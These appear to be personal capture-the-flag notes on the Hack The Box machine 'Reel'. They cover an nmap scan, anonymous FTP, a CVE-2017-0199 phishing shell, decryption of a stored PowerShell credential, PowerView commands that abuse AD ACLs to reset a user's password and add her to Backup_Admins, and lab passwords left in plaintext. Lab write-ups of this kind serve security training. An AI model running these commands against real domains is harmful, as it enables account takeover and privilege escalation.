## NMAP SCAN
```
nmap -sSCV -p- 10.129.15.193                                                  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-21 09:50 +0700
Nmap scan report for 10.129.15.193
Host is up (0.095s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-29-18  12:19AM       <DIR>          documents
22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp    open  smtp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello: 
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help: 
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   SIPOptions: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|   TerminalServerCookie: 
|     220 Mail Service ready
|_    sequence of commands
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49159/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.99%I=7%D=4/21%Time=69E6E6F5%P=x86_64-pc-linux-gnu%r(NULL
SF:,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Hello,3A,"220\x20Mail\x20S
SF:ervice\x20ready\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r\n")%
SF:r(Help,54,"220\x20Mail\x20Service\x20ready\r\n211\x20DATA\x20HELO\x20EH
SF:LO\x20MAIL\x20NOOP\x20QUIT\x20RCPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n"
SF:)%r(GenericLines,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20s
SF:equence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r
SF:\n")%r(GetRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20
SF:sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\
SF:r\n")%r(HTTPOptions,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x
SF:20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20command
SF:s\r\n")%r(RTSPRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad
SF:\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comma
SF:nds\r\n")%r(RPCCheck,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSVer
SF:sionBindReqTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSStatusReq
SF:uestTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SSLSessionReq,18,"2
SF:20\x20Mail\x20Service\x20ready\r\n")%r(TerminalServerCookie,36,"220\x20
SF:Mail\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\
SF:n")%r(TLSSessionReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Kerbero
SF:s,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SMBProgNeg,18,"220\x20Mai
SF:l\x20Service\x20ready\r\n")%r(X11Probe,18,"220\x20Mail\x20Service\x20re
SF:ady\r\n")%r(FourOhFourRequest,54,"220\x20Mail\x20Service\x20ready\r\n50
SF:3\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\
SF:x20commands\r\n")%r(LPDString,18,"220\x20Mail\x20Service\x20ready\r\n")
SF:%r(LDAPSearchReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(LDAPBindRe
SF:q,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SIPOptions,162,"220\x20Ma
SF:il\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n5
SF:03\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of
SF:\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\
SF:x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comman
SF:ds\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequenc
SF:e\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\
SF:x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x2
SF:0commands\r\n");
Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-21T02:57:31
|_  start_date: 2026-04-21T02:47:27
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: -19m56s, deviation: 34m35s, median: 1s
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: REEL
|   NetBIOS computer name: REEL\x00
|   Domain name: HTB.LOCAL
|   Forest name: HTB.LOCAL
|   FQDN: REEL.HTB.LOCAL
|_  System time: 2026-04-21T03:57:34+01:00
```

OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
FTP anon login is there
smb,ssh,smtp and rpc

## FTP
```
ftp Anonymous@10.129.15.193                                                                                                                                                              
Connected to 10.129.15.193.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||41001|)
125 Data connection already open; Transfer starting.
05-29-18  12:19AM       <DIR>          documents
226 Transfer complete.
ftp> cd documents
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||41003|)
125 Data connection already open; Transfer starting.
05-29-18  12:19AM                 2047 AppLocker.docx
05-28-18  02:01PM                  124 readme.txt
10-31-17  10:13PM                14581 Windows Event Forwarding.docx
```
got all the files, windows event forwarding is something to look for

we are going to use https://github.com/bhdresh/CVE-2017-0199 as readme file says 
![[Pasted image 20260421131408.png]]

created a shell and got the shell after sending the email (have to send email to get shell)
![[Pasted image 20260421141558.png]]

converted report.hta to test.rtf  and sent the email 
![[Pasted image 20260421141759.png|697]]
got user flag 
![[Pasted image 20260421141927.png]]

there is a cred file.. 
```
C:\Users\nico\Desktop>type cred.xml <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"> <Obj RefId="0"> <TN RefId="0"> <T>System.Management.Automation.PSCredential</T> <T>System.Object</T> </TN> <ToString>System.Management.Automation.PSCredential</ToString> <Props> <S N="UserName">HTB\Tom</S> <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d2 0f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS> </Props> </Obj> </Objs>
```

lets crack the pass
```
C:\Users\nico\Desktop>powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *" UserName : Tom Password : 1ts-mag1c!!! SecurePassword : System.Security.SecureString Domain : HTB
```
now ssh to tom 
```
C:\users\tom\desktop\AD Audit\BloodHound\Ingestors> dir Directory: C:\users\tom\desktop\AD Audit\BloodHound\Ingestors Mode LastWriteTime Length Name ---- ------------- ------ ---- -a--- 11/16/2017 11:50 PM 112225 acls.csv -a--- 10/28/2017 9:50 PM 3549 BloodHound.bin -a--- 10/24/2017 4:27 PM 246489 BloodHound_Old.ps1 -a--- 10/24/2017 4:27 PM 568832 SharpHound.exe -a--- 10/24/2017 4:27 PM 636959 SharpHound.ps1
```
good acls file.... So tom has WriteOwner rights over claire
claire has WriteDacl rights over the Backup_Admins group

```
tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound>powershell Windows PowerShell Copyright (C) 2014 Microsoft Corporation. All rights reserved. PS C:\Users\tom\Desktop\AD Audit\BloodHound> . .\PowerView.ps1
```

 set tom as the owner of claire’s ACL
 ```
 PS C:\users\tom\desktop\AD Audit\BloodHound> Set-DomainObjectOwner -identity claire -OwnerIdentity tom
 ```
give tom permissions to change passwords on that ACL
```
PS C:\users\tom\desktop\AD Audit\BloodHound> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
```
create a credential, and then set claire’s password
```
PS C:\users\tom\desktop\AD Audit\BloodHound> $cred = ConvertTo-SecureString "passw0rd!" -AsPlainText -force 
PS C:\users\tom\desktop\AD Audit\BloodHound> Set-DomainUserPassword -identity claire -accountpassword $cred
```

now ssh to claire and check who is in backup_admins group
```
claire@REEL C:\Users\claire>net group backup_admins Group name Backup_Admins Comment Members ------------------------------------------------------------------------------- ranj The command completed successfully.
```

lets try to add us in the group 
```
claire@REEL C:\Users\claire>net group backup_admins claire /add The command completed successfully. claire@REEL C:\Users\Administrator>net group backup_admins Group name Backup_Admins Comment Members ------------------------------------------------------------------------------- claire ranj The command completed successfully.
```

```
claire@REEL C:\Users\Administrator\Desktop>dir Volume in drive C has no label. Volume Serial Number is CC8A-33E1 Directory of C:\Users\Administrator\Desktop 01/21/2018 02:56 PM <DIR> . 01/21/2018 02:56 PM <DIR> .. 11/02/2017 09:47 PM <DIR> Backup Scripts 10/28/2017 11:56 AM 32 root.txt 1 File(s) 32 bytes 3 Dir(s) 15,725,092,864 bytes free claire@REEL C:\Users\Administrator\Desktop>type root.txt Access is denied. claire@REEL C:\Users\Administrator\Desktop>icacls root.txt root.txt: Access is denied.
```
not able to read...

found files
```
claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>dir Volume in drive C has no label. Volume Serial Number is CC8A-33E1 Directory of C:\Users\Administrator\Desktop\Backup Scripts 11/02/2017 09:47 PM <DIR> . 11/02/2017 09:47 PM <DIR> .. 11/03/2017 11:22 PM 845 backup.ps1 11/02/2017 09:37 PM 462 backup1.ps1 11/03/2017 11:21 PM 5,642 BackupScript.ps1 11/02/2017 09:43 PM 2,791 BackupScript.zip 11/03/2017 11:22 PM 1,855 folders-system-state.txt 11/03/2017 11:22 PM 308 test2.ps1.txt 6 File(s) 11,903 bytes 2 Dir(s) 15,725,092,864 bytes free
```

found admin pass in backupscript.ps1 
```
# admin password
$password="Cr4ckMeIfYouC4n!"
```

lets ssh and get the root flag 
```
administrator@REEL C:\Users\Administrator\Desktop>dir Volume in drive C has no label. Volume Serial Number is CC8A-33E1 Directory of C:\Users\Administrator\Desktop 21/01/2018 15:56 <DIR> . 21/01/2018 15:56 <DIR> .. 02/11/2017 22:47 <DIR> Backup Scripts 28/10/2017 12:56 32 root.txt 1 File(s) 32 bytes 3 Dir(s) 15,757,074,432 bytes free
```